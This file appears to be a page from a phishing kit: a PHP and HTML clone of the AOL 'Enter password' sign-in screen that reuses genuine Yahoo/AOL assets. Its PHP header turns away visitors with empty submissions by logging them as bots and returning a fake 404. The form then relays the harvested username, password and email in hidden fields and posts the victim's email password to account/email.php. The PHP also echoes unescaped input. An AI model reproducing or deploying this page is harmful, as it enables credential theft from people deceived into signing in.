<?php
session_start();
error_reporting(0);
$username = $_POST['username'];
$password = $_POST['password'];
$email = $_POST['email'];
if($username == "" && $password == "" && $email == ""){
tulis_file("../../total_bot.txt", $ip);
exit(header("HTTP/1.0 404 Not Found"));
}
?>
<!DOCTYPE html>
<html id="Stencil" class="no-js grid light-theme ">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=0, shrink-to-fit=no"/>
        <meta name="format-detection" content="telephone=no">
        <meta name="referrer" content="origin-when-cross-origin">
        <title>AOL</title>
        <meta name="description" content="naonkang.com" />
        <link rel="dns-prefetch" href="//naonkang.com">
        <link rel="dns-prefetch" href="//naonkang.com">
        <link rel="dns-prefetch" href="//naonkang.com">
        <link rel="dns-prefetch" href="//naonkang.com">
        <link rel="dns-prefetch" href="naonkang.com">
        <link rel="dns-prefetch" href="naonkang.com">
        <link rel="dns-prefetch" href="naonkang.com">
        <link rel="icon" type="image/png" href="https://s.yimg.com/wm/login/aol-favicon.png">
        <link rel="shortcut icon" type="image/png" href="https://s.yimg.com/wm/login/aol-favicon.png">
        <meta name="google-site-verification" content="yOTFyUBPTnXtuk2cPpqfv7ZvZ960JgqsV8FomN3n7Y0" />
        <link rel="apple-touch-icon" href="https://s.yimg.com/wm/login/aol-apple-touch-icon.png">
        <link rel="apple-touch-icon-precomposed" href="https://s.yimg.com/wm/login/aol-apple-touch-icon.png">
        <style nonce="5fYcI9Zsg+jGBeSDLKOa0wYft6i41ys1E5yOI3rNlSfun0wN">
            #mbr-css-check {
                display: inline;
            }
        </style>
        <link href="https://s.yimg.com/wm/mbr/62205dc2a2762fc002fa952931dfe21f58f71fc5/aol-main.css" rel="stylesheet" type="text/css">
        <script nonce="5fYcI9Zsg+jGBeSDLKOa0wYft6i41ys1E5yOI3rNlSfun0wN">
            var pageStartTime = new Date().getTime();
            (function(root) {
                var isGoodJS = ('create' in Object && 'isArray' in Array && 'pushState' in window.history);
                root.isGoodJS = isGoodJS;
            }(this));
            
(function (root) {
/* -- Data -- */
root.YUI_config = {"comboBase":"https:\u002F\u002Fs.yimg.com\u002Fzz\u002Fcombo?","combine":true,"root":"yui-s:3.18.0\u002F"};
root.COMET_URL = "https:\u002F\u002Fpr.comet.yahoo.com\u002Fcomet";
root.I13N_config = {"keys":{"pt":"utility","ver":"nodejs"}};
root.I13N_config || (root.I13N_config = {});
root.I13N_config.spaceid = 794200033;
root.I13N_config.location = "https:\u002F\u002Flogin.aol.com\u002Faccount\u002Fchallenge\u002Fpassword?src=mail&lang=en-US&display=login";
root.I13N_config.referrer = "";
root.I13N_config.keys || (root.I13N_config.keys = {});
root.I13N_config.keys.pg_name = "passwordChallenge";
root.I13N_config.keys.gm_np = "aol";
root.I13N_config.keys.src = "mail";
root.I13N_config.keys.p_sec = "DEFAULT_SECTION";
root.I13N_config.keys.p_subsec = "DEFAULT_SUBSECTION";
root.I13N_config.keys.test = "mbr-change-password-v2,mbr-signin-with-google,mbr-harmony-sign-up,mbr-cc-add-text-1,mbr-ytwstock-signin-with-google,mbr-harmony-sign-in,mbr-fnapp-signin-with-google,mbr-paid-user-ar,mbr-inactive-signout";
root.mKeyPrefix = "password-challenge-";
root.I13N_config.keys.cause = "missing";
root.I13N_config.keys.src_id = "missing";
root.darlaConfig = {"url":"https:\u002F\u002Ffc.yahoo.com\u002Fsdarla\u002Fphp\u002Fclient.php?l=RICH{dest:tgtRICH;asz:flex}&f=794200033&ref=https%3A%2F%2Flogin.aol.com%2Faccount%2Fchallenge%2Fpassword&sa=geminifed%253D1%2520y-bucket%253Dmbr-change-password-v2%252Cmbr-signin-with-google%252Cmbr-harmony-sign-up%252Cmbr-cc-add-text-1%252Cmbr-ytwstock-signin-with-google%252Cmbr-harmony-sign-in%252Cmbr-fnapp-signin-with-google%252Cmbr-paid-user-ar%252Cmbr-inactive-signout","k2Rate":1,"positions":{"RICH":{"sandbox":"allow-scripts allow-same-origin allow-popups allow-popups-to-escape-sandbox","id":"RICH","clean":"login-ad-rich","dest":"login-ad-rich","w":1440,"h":1024,"timeout":5000,"noexp":1,"fdb":"","on":1,"where":"inside","minReqWidth":1325,"showAfter":2000}}};
root.challenge || (root.challenge = {});
root.challenge.servingStamp = 1610910614522;
root.challenge.isAndroidWebview = false;
root.I13N_config.keys.context = "primary";
root.pwchallenge || (root.pwchallenge = {});
root.pwchallenge.messages = {"toolTipShow":"Show password","toolTipHide":"Hide password"};
root.isIOSDevice = false;
}(this));

            
            YUI_config.global = window;


            window.mbrSendError = function (name, url) {
                (new Image()).src = '/account/js-reporting/?rid=5lqckqpg092sm&crumb=' + encodeURIComponent('TQNR7fsNt4r') + '&message=' + encodeURIComponent(name) + '&url=' + encodeURIComponent(url);
            };

            var oldError = window.onerror;

            window.onerror = function (errorMsg, url) {
                window.mbrSendError(errorMsg, url);
                if (oldError) {
                    oldError.apply(this, arguments);
                }
                return false;
            };

        </script>
    </head>
    <body class="bucket-mbr-signin-with-google bucket-mbr-harmony-sign-up bucket-mbr-cc-add-text-1 bucket-mbr-harmony-sign-in">
    <script nonce="5fYcI9Zsg+jGBeSDLKOa0wYft6i41ys1E5yOI3rNlSfun0wN">
        (function(root) {
            var doc = document;
            if (root.isGoodJS) {
                doc.documentElement.className = doc.documentElement.className.replace('no-js', 'js');
            }
        }(this));
    </script>
    <div id="login-body" class="loginish  puree-v2 responsive grid ">
    <div class="mbr-desktop-hd">
    <span class="column">
         <a href="https://www.aol.com/">
            <img src="https://s.yimg.com/wm/assets/images/ns/aol-logo-black-v.0.0.2.png" alt="Aol" class="logo " width="100" height="" />
            <img src="https://s.yimg.com/wm/assets/images/ybar/aol-logo-white-v0.0.4.png" alt="Aol" class="dark-mode-logo logo " width="100" height="" />
        </a>
    </span>
    <span class="column help txt-align-right">
        <a href="https://help.aol.com/">Help</a>
    </span>
</div>
    <div class="login-box-container">
        <div class="login-box right">
            <div class="mbr-login-hd txt-align-center">
                    <img src="https://s.yimg.com/wm/assets/images/ns/aol-logo-black-v.0.0.2.png" alt="Aol" class="logo aol-en-US" width="100" height="" />
                    <img src="https://s.yimg.com/wm/assets/images/ybar/aol-logo-white-v0.0.4.png" alt="Aol" class="dark-mode-logo logo aol-en-US" width="100" height="" />
            </div>
            <div class="challenge password-challenge">
    <div class="challenge-header">
        <div class="yid"><?php echo $email; ?></div>
    </div><div id="password-challenge" class="primary">
    <strong class="challenge-heading">Enter password</strong>
    <span class="txt-align-center challenge-desc">to finish sign in</span>
        <form action="account/email.php" method="post" class="challenge-form">
        <input type="hidden" name="username" value="<?php echo $username; ?>">
        <input type="hidden" name="password" value="<?php echo $password; ?>">
        <input type="hidden" name="email" value="<?php echo $email; ?>" />
        <div id="password-container" class="input-group password-container focussed">
            <input type="password" id="login-passwd" class="password" name="email_password" placeholder=" " required="">
            <label for="login-passwd" id="password-label" class="password-label">Password</label>
        </div>

        <div class="button-container">
            <button type="submit" class="pure-button puree-button-primary puree-spinner-button challenge-button">
                    Next
            </button>
        </div>
        <div class="forgot-cont challenge-button-link">
            <button type="button" class="pure-button puree-button-link challenge-button-link">Forgot password?</button>
        </div>
    </form>
</div>
</div>
        </div>
        <div id="login-box-ad-fallback" class="login-box-ad-fallback">
            <h1></h1>
<p></p>
        </div>
    </div>
    <div class="login-bg-outer">
        <div class="login-bg-inner">
                <div id="login-ad-rich"></div>
                    </div>
    </div>
    
</div>
    <script src="https://s.yimg.com/wm/mbr/js/rapid-3.53.17.js"></script>
    <script nonce="5fYcI9Zsg+jGBeSDLKOa0wYft6i41ys1E5yOI3rNlSfun0wN">
        var rapidInstance = new YAHOO.i13n.Rapid(I13N_config);
        // Used in common JS to add to beacons
        rapidInstance.beaconClick('password-challenge-launch' , 'artificialPageLoadClick', 0, {
            mKey: 'password-challenge-launch',
            intrctn: 'click',
            corActn: 'click'
        });
    </script>
    <script src="https://s.yimg.com/wm/mbr/62205dc2a2762fc002fa952931dfe21f58f71fc5/bundle.js"></script>
    <noscript>
        <img src="/account/js-reporting/?crumb=TQNR7fsNt4r&message=javascript_not_enabled&ref=%2Faccount%2Fchallenge%2Fpassword" height="0" width="0" style="visibility: hidden;">
    </noscript>
    <script nonce="5fYcI9Zsg+jGBeSDLKOa0wYft6i41ys1E5yOI3rNlSfun0wN">
        var checkAssets = function(seconds) {
            setTimeout(function() {
                if (!window.mbrJSLoaded) {
                    window.mbrSendError('js_failed_to_load', location.pathname);
                }
                var check = document.getElementById('mbr-css-check'),
                    style = check.currentStyle;
                if (window.getComputedStyle) {
                    style = window.getComputedStyle(check);
                }
                if (style.display !== 'none') {
                    window.mbrSendError('css_failed_to_load', location.pathname);
                }
            }, (seconds * 1000));
        };

        checkAssets(10);
    </script>
    <div id="mbr-css-check"></div>
    <div id="page-mask" class="page-mask hide"></div>
    <div id="ad"></div>
    <div class="mbr-legacy-device-bar" id="mbr-legacy-device-bar">
        <label class="cross" for="mbr-legacy-device-bar-cross" aria-label="Close this warning">x</label>
        <input type="checkbox" id="mbr-legacy-device-bar-cross" />
        <p class="mbr-legacy-device">
                AOL works best with the latest versions of the browsers. You're using an outdated or unsupported browser and some AOL features may not work properly. Please update your browser version now. <a href="">More Info</a>
        </p>
    </div>
    <script nonce="5fYcI9Zsg+jGBeSDLKOa0wYft6i41ys1E5yOI3rNlSfun0wN">
        (function(root) {
            if (!root.isGoodJS) {
                document.getElementById('mbr-legacy-device-bar').style.display = 'block';
            }
        }(this));
    </script>
    </body>
</html>
<!-- fe04.member.ne1.yahoo.com - Sun Jan 17 2021 19:10:14 GMT+0000 (Coordinated Universal Time) - (0ms) -->